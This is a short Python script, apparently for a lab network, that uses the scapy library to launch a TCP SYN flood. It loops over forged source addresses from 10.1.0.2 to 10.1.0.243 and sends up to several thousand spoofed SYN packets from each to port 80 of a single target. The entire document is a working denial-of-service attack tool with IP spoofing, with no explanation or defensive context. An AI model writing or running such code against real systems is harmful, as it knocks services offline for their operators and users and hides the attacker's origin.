from scapy.all import *
import sys
import random


def syn_flood(source_ip, target_ip, target_port, count):
    for _ in range(count):
        packet = IP(src=source_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
        send(packet, verbose=0)

ip_address = "10.12.0.10"
port = 80
for i in range(2, 244):
    source_ip = f"10.1.0.{i}"
    packet_number = random.randint(100, 4000)
    print("sending syn packet from",source_ip,"to:",ip_address)
    syn_flood(source_ip, ip_address, port,packet_number)
